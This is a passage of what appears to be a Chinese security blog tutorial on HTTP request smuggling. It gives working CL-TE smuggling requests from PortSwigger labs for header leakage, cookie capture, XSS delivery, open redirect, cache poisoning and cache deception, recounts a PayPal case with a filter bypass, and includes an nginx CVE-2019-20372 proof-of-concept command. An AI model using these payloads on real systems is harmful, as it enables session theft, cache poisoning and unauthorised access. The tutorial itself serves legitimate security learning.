的情况类似，这里就不再重复举例了。</p><h2 id="3-2-Revealing-Front-end-Request-Rewriting-portswigger"><a href="#3-2-Revealing-Front-end-Request-Rewriting-portswigger" class="headerlink" title="3.2 Revealing Front-end Request Rewriting-portswigger"></a>3.2 Revealing Front-end Request Rewriting-portswigger</h2><blockquote><p> 在有的网络环境下，前端代理服务器在收到请求后，不会直接转发给后端服务器，而是先添加一些必要的字段，然后再转发给后端服务器。这些字段是后端服务器对请求进行处理所必须的，比如：</p><ul><li>描述TLS连接所使用的协议和密码</li><li>包含用户IP地址的XFF头</li><li>用户的会话令牌ID</li></ul><p>总之，如果不能获取到代理服务器添加或者重写的字段，我们走私过去的请求就不能被后端服务器进行正确的处理。那么我们该如何获取这些值呢。PortSwigger提供了一个很简单的方法，主要是三大步骤：</p><ul><li>找一个能够将请求参数的值输出到响应中的POST请求</li><li>把该POST请求中，找到的这个特殊的参数放在消息的最后面</li><li>然后走私这一个请求，然后直接发送一个普通的请求，前端服务器对这个请求重写的一些字段就会显示出来。</li></ul></blockquote><p>有时候 Front 服务器会给转发的请求添加一些请求头再转发给 Backend 服务器，我们可以利用 HTTP Smuggling 的方式来泄露这些请求头。同样我们借助 LAB 来实践理解：<br><a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting">Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting</a></p><blockquote><p>This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding.</p><p>There’s an admin panel at /admin, but it’s only accessible to people with the IP address 127.0.0.1. The front-end server adds an HTTP header to incoming requests containing their IP address. It’s similar to the X-Forwarded-For header but has a different name.</p><p>To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user carlos.</p></blockquote><p>这里根据题目提示，场景是一个 CL-TE 的场景，并且给出一个搜索框，我们尝试随便搜索一个 123 ，可以发现搜索结果”123”直接回显到了相应当中。<br><img src="http://image.v0w.top/2020/12/16082772709116.jpg"><br>尝试使用 HTTP Smuggling 方式访问，但是被 blocked ：<br><img src="http://image.v0w.top/2020/12/16082775478694.jpg" alt="HTTP Smuggling-Blocked"><br>然后我们可以尝试利用搜索回显把 Front 服务器转发的请求头给泄露出来：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: acc61fe41f553ac880ba439700060035.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Cookie: session&#x3D;LyaWdPjtN9GYWViLvsbQ8go6gAqSMJLZ</span><br><span class="line">Content-Length: 103</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Length: 99</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">search&#x3D;123</span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/2020/12/16082785120473.jpg" alt="Reveal HTTP request"><br>很神奇！对吧！那么为什么呢？<br><strong>插一句原理</strong><br>这是如何获取的呢，可以从我们构造的数据包来入手，可以看到，我们走私过去的请求为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Length: 99</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">search&#x3D;123</span><br></pre></td></tr></table></figure><p>其中Content-Length的值为99，显然下面携带的数据的长度是不够99的，因此后端服务器在接收到这个走私的请求之后，会认为这个请求还没传输完毕，继续等待传输。接着我们又继续发送相同的数据包，后端服务器接收到的是前端代理服务器已经处理好的请求，当接收的数据的总长度到达99时，后端服务器认为这个请求已经传输完毕了，然后进行响应。这时实际拼接的请求是这样的：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Length: 99</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">search&#x3D;123POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">X-txptGX-Ip: 58.32.7.15</span><br><span class="line">Host: acc61fe41f553ac880ba439700060035.web-secu</span><br></pre></td></tr></table></figure><p>又因为这个web的功能会将search变量的内容打印回显，于是就可以回显request-header了。</p><p><strong>我们继续：</strong></p><p>这里还有一个技巧，我们直接添加<code>X-txptGX-Ip: 127.0.0.1</code>这个header，还是没法请求出来<br><img src="http://image.v0w.top/2020/12/16082794234377.jpg"></p><p>这是因为我们伪造的<code>X-txptGX-Ip</code>被服务器加上的<code>X-txptGX-Ip</code>覆盖掉了，我们可以利用上面提到的技巧，同样利用<code>Content-Length</code>将服务器加上的header给截断。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: acc61fe41f553ac880ba439700060035.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Cookie: session&#x3D;LyaWdPjtN9GYWViLvsbQ8go6gAqSMJLZ</span><br><span class="line">Content-Length: 75</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;admin HTTP&#x2F;1.1</span><br><span class="line">X-txptGX-Ip: 127.0.0.1</span><br><span class="line">Content-Length: 10</span><br><span class="line"></span><br><span class="line">a&#x3D;1</span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/2020/12/16082790456000.jpg" alt="/admin"></p><p><img src="http://image.v0w.top/2020/12/16082792494354.jpg" alt="solved"></p><h2 id="3-3-Capturing-other-users’-requests"><a href="#3-3-Capturing-other-users’-requests" class="headerlink" title="3.3 Capturing other users’ requests"></a>3.3 Capturing other users’ requests</h2><p>既然能拿到中间件请求，当然我们也可以尝试去拿其他用户的请求，也能拿到 Cookie 等，LAB 地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests">Lab: Exploiting HTTP request smuggling to capture other users’ requests</a></p><blockquote><p>This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding.</p><p>To solve the lab, smuggle a request to the back-end server that causes the next user’s request to be stored in the application. Then retrieve the next user’s request and use the victim user’s cookies to access their account.</p></blockquote><p>原理也比较简单，我们可以找到一个发评论的地方，然后利用评论处进行 HTTP Smuggling，例如，我们可以构造以下请求包：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: acc51fba1f95d19a80172e4f007d00cb.web-security-academy.net</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8</span><br><span class="line">Cookie: session&#x3D;icN18J6eM0IZS64G9YqaeGjb45KyTpjq</span><br><span class="line">Content-Length: 272</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST &#x2F;post&#x2F;comment HTTP&#x2F;1.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 999</span><br><span class="line">Cookie: session&#x3D;icN18J6eM0IZS64G9YqaeGjb45KyTpjq</span><br><span class="line"></span><br><span class="line">csrf&#x3D;6DZBJoDtpC8hMUB5c5YggKCPBxdPY328&amp;postId&#x3D;2&amp;name&#x3D;vow&amp;email&#x3D;1111%40qq.com&amp;website&#x3D;http%3A%2F%2Fv0w.top&amp;comment&#x3D;V0W</span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/2020/12/16086195688708.jpg" alt="burp"></p><p><img src="http://image.v0w.top/2020/12/16086195839134.jpg" alt="result"></p><p>可以看到我们可以smuggle别人的HTTP请求，如果CL足够长，我们可以获取别人的cookie。但是实测发现这个实验可能不是很好抓到别人的cookie，我抓的还是自己的。。。<br>当我CL调整到2000之后，又容易出<code>Internal Server Error</code>的报错。但是这个攻击方式的原理应该还是比较好理解的。</p><h2 id="3-4-Exploit-Reflected-XSS"><a href="#3-4-Exploit-Reflected-XSS" class="headerlink" title="3.4 Exploit Reflected XSS"></a>3.4 Exploit Reflected XSS</h2><p>这个利用场景可能比较受限，也比较少见，但是如果存在 HTTP Smuggling &amp; reflected XSS ，我们就可以利用这个组合拳 XSS 拿到别人的 cookie</p><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss">https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss</a></p><blockquote><p>This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding.</p><p>The application is also vulnerable to <a href="https://portswigger.net/web-security/cross-site-scripting/reflected">reflected XSS</a> via the User-Agent header.</p><p>To solve the lab, smuggle a request to the back-end server that causes the next user’s request to receive a response containing an XSS exploit that executes alert(1).</p></blockquote><p>还是依旧的 CL-TE 场景，我们可以在 UA 处发现有一个反射 XSS，但是单这样没什么用，所以我们得想点办法升级危害。<br><img src="http://image.v0w.top/2020/12/16086209284386.jpg" alt="XSS"><br>如果我们利用smuggle，然后请求中，其他用户访问的时候，就可以扩大触发面和攻击面。<br><img src="http://image.v0w.top/2020/12/16086212206652.jpg" alt="smuggle+XSS"><br><img src="http://image.v0w.top/2020/12/16086213488265.jpg" alt="show"></p><p>利用smuggle+XSS进行攻击，请求一次，然后任意访问站内路径，都可以触发XSS。</p><h2 id="3-5-Turn-An-On-Site-Redirect-Into-An-Open-Redirect"><a href="#3-5-Turn-An-On-Site-Redirect-Into-An-Open-Redirect" class="headerlink" title="3.5 Turn An On-Site Redirect Into An Open Redirect"></a>3.5 Turn An On-Site Redirect Into An Open Redirect</h2><p>这个其实很好理解，利用请求中修改host，例如在 Apache &amp; IIS 服务器上，一个uri 最后不带 / 的请求会被 30x 导向带 / 的地址，例如发送以下请求：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;home HTTP&#x2F;1.1</span><br><span class="line">Host: normal-website.com</span><br></pre></td></tr></table></figure><p>我们会得到 Response :</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">content-type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">location: https:&#x2F;&#x2F;normal-website.com&#x2F;</span><br><span class="line">content-length: 62</span><br><span class="line"></span><br><span class="line">&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;normal-website.com&#x2F;&quot;&gt;Moved Permanently&lt;&#x2F;a&gt;.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看起来没什么危害，但是如果我们配合 HTTP Smuggling 就会有问题了，例如：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Length: 54</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;home HTTP&#x2F;1.1</span><br><span class="line">Host: attacker-website.com</span><br><span class="line">Foo: X</span><br></pre></td></tr></table></figure><p>Smugle 之后的请求会像以下这样：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;home HTTP&#x2F;1.1</span><br><span class="line">Host: attacker-website.com</span><br><span class="line">Foo: XGET &#x2F;scripts&#x2F;include.js HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br></pre></td></tr></table></figure><p>然后如果服务器根据 Host 进行跳转的话，我们会得到以下的 Response:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Location: https:&#x2F;&#x2F;attacker-website.com&#x2F;home&#x2F;</span><br></pre></td></tr></table></figure><p>这样，受害者，也就是访问<code>/scripts/include.js</code>这个的用户，会被跳转到我们控制的 url 了。</p><h2 id="3-6-Perform-Web-Cache-Poisoning"><a href="#3-6-Perform-Web-Cache-Poisoning" class="headerlink" title="3.6 Perform Web Cache Poisoning"></a>3.6 Perform Web Cache Poisoning</h2><p>这个场景也是基于上面的 Host 跳转的攻击场景，如果 Front 服务器还存在缓存静态资源的话，我们可以配合 HTTP Smuggling 进行缓存投毒，<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning">Lab: Exploiting HTTP request smuggling to perform web cache poisoning</a></p><blockquote><p>This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding. The front-end server is configured to cache certain responses.</p><p>To solve the lab, perform a <a href="https://portswigger.net/web-security/request-smuggling">request smuggling</a> attack that causes the cache to be poisoned, such that a subsequent request for a JavaScript file receives a redirection to the exploit server.</p></blockquote><p>这个环境也是一个可以修改 Host 进行跳转的场景，而在<code>/post/next?postId=2</code>路由正好有一个跳转的 api 供我们使用，这个路由跳转到的是<code>/post?postId=4</code>。</p><p>根据题目描述，我们需要实现缓存投毒， 例如这里我们就选择<code>/resources/js/tracking.js</code>进行投毒，LAB 还给了我们制造投毒的服务器，于是我们可以进行以下设置：<br><img src="http://image.v0w.top/2020/12/16086248095862.jpg" alt="投毒服务器设置"><br>(<a href="http://image.v0w.top/2020/12/16086238774792.jpg">http://image.v0w.top/2020/12/16086238774792.jpg</a>)</p><p>然后构造走私请求：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac331fcd1fc4121680b3459100bc00b4.web-security-academy.net</span><br><span class="line">Content-Length: 129</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;post&#x2F;next?postId&#x3D;3 HTTP&#x2F;1.1</span><br><span class="line">Host: ac9b1f2a1fd1126180bb4545012a00b0.web-security-academy.net</span><br><span class="line">Content-Length: 10</span><br><span class="line"></span><br><span class="line">123</span><br></pre></td></tr></table></figure><p>然后访问<code>/resources/js/tracking.js</code>,发现重定向到恶意构造的地址:<br><img src="http://image.v0w.top/2020/12/16086237310898.jpg" alt="缓存js重定向到恶意地址"></p><p>我们可以看到响应包的跳转地址被我们修改成了我们 exploit 的服务器地址，然后我们访问正常服务器主页试试：<br><img src="http://image.v0w.top/2020/12/16086249002894.jpg" alt="-w853"></p><p>可以看到成功弹窗。</p><p>整个流程我们可以利用以下流程来理解：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Innocent        Attacker          Front           Backend</span><br><span class="line">    |               |               |               |</span><br><span class="line">    |               |--A(1A+1&#x2F;2B)--&gt;|               | </span><br><span class="line">    |               |               |--A(1A+1&#x2F;2B)--&gt;| </span><br><span class="line">    |               |               |&lt;-A(200)-------|</span><br><span class="line">    |               |               |            [1&#x2F;2B]</span><br><span class="line">    |               |&lt;-A(200)-------|            [1&#x2F;2B]</span><br><span class="line">    |               |--C-----------&gt;|            [1&#x2F;2B]</span><br><span class="line">    |               |               |--C-----------&gt;| * ending B *</span><br><span class="line">    |               |            [*CP*]&lt;--B(200)----|</span><br><span class="line">    |               |&lt;--B(200)------|               |</span><br><span class="line">    |--C---------------------------&gt;|               |</span><br><span class="line">    |&lt;--B(200)--------------------[HIT]             |</span><br></pre></td></tr></table></figure><ul><li>1A + 1/2B means request A + an incomplete query B</li><li>A(X) : means X query is hidden in body of query A</li><li>CP : Cache poisoning</li></ul><p>与之前那个流程图类似，因为在 C 请求的<code>/resources/js/tracking.js</code>会被 Front 认为是静态资源缓存起来，而我们利用 HTTP Smuggling 将这个请求导向了我们的 exploit 服务器，返回了<code>alert(1)</code>给 C 请求，然后这个响应包就会被 Front 服务器缓存起来，这样我们就成功进行了投毒。</p><h2 id="3-7-Perform-Web-Cache-Deception"><a href="#3-7-Perform-Web-Cache-Deception" class="headerlink" title="3.7 Perform Web Cache Deception"></a>3.7 Perform Web Cache Deception</h2><p>其实这个场景与缓存投毒类似，但是稍有一点区别，按照比较官方的说法，缓存欺骗与缓存投毒有以下这些区别：</p><blockquote><p> What is the difference between web cache poisoning and web cache deception?</p><ul><li>In <strong>web cache poisoning</strong>, the attacker causes the application to store some malicious content in the cache, and this content is served from the cache to other application users.</li><li>In <strong>web cache deception</strong>, the attacker causes the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache.</li></ul></blockquote><ul><li>在 Web 缓存投毒中，攻击者使应用程序将某些恶意内容存储在缓存中，并将该内容从缓存中提供给其他应用程序用户。</li><li>在Web缓存欺骗中，攻击者使应用程序将一些属于另一个用户的敏感内容存储在缓存中，然后攻击者从缓存中检索该内容。</li></ul><p>我们可以这么理解，我们发送如下 HTTP 请求：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Length: 43</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;private&#x2F;messages HTTP&#x2F;1.1</span><br><span class="line">Foo: X</span><br></pre></td></tr></table></figure><p>该 Smugle 的请求会用<code>Foo: X</code>吃掉下一个发过来的请求头的第一行，也就是<code>GET /xxx HTTP/1.1</code>那一行，并且这个请求还会带着用户的 Cookie 去访问，类似于一个CSRF，该请求变成了以下请求头：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;private&#x2F;messages HTTP&#x2F;1.1</span><br><span class="line">Foo: XGET &#x2F;static&#x2F;some-image.png HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Cookie: sessionId&#x3D;q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z</span><br></pre></td></tr></table></figure><p>只要我们多发送几次，一旦用户访问的是静态资源，就可能会被 Front 服务器缓存起来，我们就可以拿到用户<code>/private/messages</code>的信息了。这里可能需要大量的重复发包，因为需要构造让静态资源缓存，还是需要一定运气的。</p><p>至此，HTTP Smuggling 的基本攻击面都已经介绍完毕了。总体来说，HTTP请求走私的随机性较强，需要的条件相对苛刻，测试的时候可能需要配合Intruder和Repeater重复发包。同时，其破坏用户正常请求，或者利用用户请求的攻击方式可以造成很大危害。</p><h1 id="0x04-实际案例"><a href="#0x04-实际案例" class="headerlink" title="0x04 实际案例"></a>0x04 实际案例</h1><h2 id="4-1-ATS"><a href="#4-1-ATS" class="headerlink" title="4.1 ATS"></a>4.1 ATS</h2><blockquote><p>Apache Traffic Server（ATS）是美国阿帕奇（Apache）软件基金会的一款高效、可扩展的HTTP代理和缓存服务器。</p><p>Apache ATS 6.0.0版本至6.2.2版本和7.0.0版本至7.1.3版本中存在安全漏洞。攻击者可利用该漏洞实施HTTP请求走私攻击或造成缓存中毒。</p><p>在美国国家信息安全漏洞库中，我们可以找到关于该漏洞的四个补丁，接下来我们详细看一下。</p><p>CVE-2018-8004 补丁列表</p><ul><li><a href="https://github.com/apache/trafficserver/pull/3192">https://github.com/apache/trafficserver/pull/3192</a></li><li><a href="https://github.com/apache/trafficserver/pull/3201">https://github.com/apache/trafficserver/pull/3201</a></li><li><a href="https://github.com/apache/trafficserver/pull/3231">https://github.com/apache/trafficserver/pull/3231</a></li><li><a href="https://github.com/apache/trafficserver/pull/3251">https://github.com/apache/trafficserver/pull/3251</a></li></ul><p>注：虽然漏洞通告中描述该漏洞影响范围到7.1.3版本，但从github上补丁归档的版本中看，在7.1.3版本中已经修复了大部分的漏洞。</p></blockquote><p>关于这四个补丁的分析与复现我觉得 @mengchen 师傅已经写的非常详细了，我就不在赘述了，建议看原文部分 <a href="https://paper.seebug.org/1048/#4-httpcve-2018-8004">HTTP走私攻击实例——CVE-2018-8004</a></p><h2 id="4-2-Paypal"><a href="#4-2-Paypal" class="headerlink" title="4.2 Paypal"></a>4.2 Paypal</h2><p>2019年分享 HTTP Smuggling 的作者在 Black Hat 上分享的 Paypal 漏洞实例：</p><h3 id="4-2-1-对js文件进行投毒"><a href="#4-2-1-对js文件进行投毒" class="headerlink" title="4.2.1 对js文件进行投毒"></a>4.2.1 对js文件进行投毒</h3><p>smuggling</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;webstatic&#x2F;r&#x2F;fb&#x2F;fb-all-prod.pp2.min.js HTTP&#x2F;1.1 </span><br><span class="line">Host: c.paypal.com</span><br><span class="line">Content-Length: 61 </span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;webstatic HTTP&#x2F;1.1</span><br><span class="line">Host: skeletonscribe.net?</span><br><span class="line">X: X</span><br></pre></td></tr></table></figure><p>request a js</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;webstatic&#x2F;r&#x2F;fb&#x2F;fb-all-prod.pp2.min.js HTTP&#x2F;1.1 </span><br><span class="line">Host: c.paypal.com</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>完整请求如下，重定向到恶意js，进行投毒</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;webstatic HTTP&#x2F;1.1</span><br><span class="line">Host: skeletonscribe.net?</span><br><span class="line">X: XGET &#x2F;webstatic&#x2F;r&#x2F;fb&#x2F;fb-all-prod.pp2.min.js HTTP&#x2F;1.1 </span><br><span class="line">Host: c.paypal.com</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>response</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 302 Found</span><br><span class="line">Location: http:&#x2F;&#x2F;skeletonscribe.net?, c.paypal.com&#x2F;webstatic&#x2F;</span><br></pre></td></tr></table></figure><h3 id="4-2-2-绕过CSP策略"><a href="#4-2-2-绕过CSP策略" class="headerlink" title="4.2.2 绕过CSP策略"></a>4.2.2 绕过CSP策略</h3><p>但是 Paypal 登录页面有 CSP 规则 <code>script-src</code> 限制了这个跳转。</p><p><img src="http://image.v0w.top/2020/12/43ccf8d84ffcarticlepaypal01.svg"></p><p>后来作者发现该页面还有一个动态生成的 iframe 引入了 c.paypal.com ，且该子页面没有 CSP 而且还引入了作者投毒的 js 文件！虽然这样可以控制 iframe 页面，但是由于同源策略，是读不到父页面的数据的。</p><p><img src="http://image.v0w.top/2020/12/8e618cf695b8articlepaypal02.svg"></p><p>再接着作者的同事在 paypal.com/us/gifts 发现了一个不使用 CSP 的页面，并且也导入了作者投毒的 js 文件，这样作者终于通过 js 将 c.paypal.com 的 iframe 重定向到了 paypal.com/us/gifts ，这样就同源了，也就可以读取父页面的数据了。</p><p><img src="http://image.v0w.top/2020/12/7fcaae230c37articlepaypal03.svg"></p><h3 id="4-2-3-修复与绕过"><a href="#4-2-3-修复与绕过" class="headerlink" title="4.2.3 修复与绕过"></a>4.2.3 修复与绕过</h3><p>Paypal 第一次修复是将 Akamai 配置修改成拒绝含有 Transfer-Encoding: chunked 的请求，但是后来又被作者构造了一个换行的 header 绕过了：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Transfer-Encoding:</span><br><span class="line"> chunked</span><br></pre></td></tr></table></figure><h1 id="0x05-nginx两个请求走私漏洞"><a href="#0x05-nginx两个请求走私漏洞" class="headerlink" title="0x05 nginx两个请求走私漏洞"></a>0x05 nginx两个请求走私漏洞</h1><h2 id="5-1-（CVE-2019-20372）Nginx-error-page-请求走私漏洞"><a href="#5-1-（CVE-2019-20372）Nginx-error-page-请求走私漏洞" class="headerlink" title="5.1 （CVE-2019-20372）Nginx error_page 请求走私漏洞"></a>5.1 （CVE-2019-20372）Nginx error_page 请求走私漏洞</h2><p><a href="https://github.com/Ares-X/VulWiki/blob/a8a7d4d4d1530681e5b7f18daf7f471f7ff5c010/Web%E5%AE%89%E5%85%A8/Nginx/%EF%BC%88CVE-2019-20372%EF%BC%89Nginx%20error_page%20%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E.md">参考链接</a></p><p>Nginx 1.17.7之前版本中 error_page 存在安全漏洞。攻击者可利用该漏洞读取未授权的Web页面。</p><blockquote><p>错误配置</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line"> listen 80;</span><br><span class="line"> server_name localhost;</span><br><span class="line"> error_page 401 http:&#x2F;&#x2F;example.org;</span><br><span class="line"> location &#x2F; &#123;</span><br><span class="line"> return 401;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line"> listen 80;</span><br><span class="line"> server_name notlocalhost;</span><br><span class="line"> location &#x2F;_hidden&#x2F;index.html &#123;</span><br><span class="line"> return 200 &#39;This should be hidden!&#39;;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这时候我们可以向服务器发送以下请求</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;a HTTP&#x2F;1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Length: 56</span><br><span class="line">GET &#x2F;_hidden&#x2F;index.html HTTP&#x2F;1.1</span><br><span class="line">Host: notlocalhost</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们看一下服务器是怎么处理的</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">printf &quot;GET &#x2F;a HTTP&#x2F;1.1\r\nHost: localhost\r\nContent-Length: 56\r\n\r\nGET</span><br><span class="line">&#x2F;_hidden&#x2F;index.html HTTP&#x2F;1.1\r\nHost: notlocalhost\r\n\r\n&quot; | ncat localhost 80 --noshutdown</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>等于说是吧两个请求都间接的执行了，我们看一下burp里面的返回值</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 302 Moved Temporarily</span><br><span class="line">Server: nginx&#x2F;1.17.6</span><br><span class="line">Date: Fri, 06 Dec 2019 18:23:33 GMT</span><br><span class="line">Content-Type: text&#x2F;html</span><br><span class="line">Content-Length: 145</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Location: http:&#x2F;&#x2F;example.org</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;302 Found&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;&lt;h1&gt;302 Found&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;hr&gt;&lt;center&gt;nginx&#x2F;1.17.6&lt;&#x2F;center&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.17.6</span><br><span class="line">Date: Fri, 06 Dec 2019 18:23:33 GMT</span><br><span class="line">Content-Type: text&#x2F;html</span><br><span class="line">Content-Length: 22</span><br><span class="line">Connection: keep-alive</span><br><span class="line">This should be hidden!</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>再一下nginx服务器里面的日志</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">172.17.0.1 - - [06&#x2F;Dec&#x2F;2019:18:23:33 +0000] &quot;GET &#x2F;a HTTP&#x2F;1.1&quot; 302 145 &quot;-&quot; &quot;-&quot; &quot;-&quot;</span><br><span class="line">172.17.0.1 - - [06&#x2F;Dec&#x2F;2019:18:23:33 +0000] &quot;GET &#x2F;_hidden&#x2F;index.html HTTP&#x2F;1.1&quot; 200 22 &quot;-&quot;</span><br></pre></td></tr></table></figure><h2 id="5-2-（CVE-2020-12440）Nginx-lt-1-8-0-请求走私"><a href="#5-2-（CVE-2020-12440）Nginx-lt-1-8-0-请求走私" class="headerlink" title="5.2 （CVE-2020-12440）Nginx &lt;= 1.8.0 请求走私"></a>5.2 （CVE-2020-12440）Nginx &lt;= 1.8.0 